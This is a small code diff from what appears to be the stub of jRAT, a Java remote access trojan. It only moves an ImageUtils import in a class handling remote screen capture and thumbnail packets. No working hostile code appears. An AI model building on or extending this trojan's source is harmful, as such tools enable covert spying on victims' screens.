@@ -14,11 +14,11 @@ import java.io.ByteArrayOutputStream;
 
 import javax.imageio.ImageIO;
 
+import se.jrat.common.utils.ImageUtils;
 import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.stub.packets.outgoing.Packet17RemoteScreen;
 import se.jrat.stub.packets.outgoing.Packet33Thumbnail;
 import se.jrat.stub.packets.outgoing.Packet68RemoteScreenComplete;
-import se.jrat.stub.utils.ImageUtils;
 
 public class Screen implements Runnable {
 
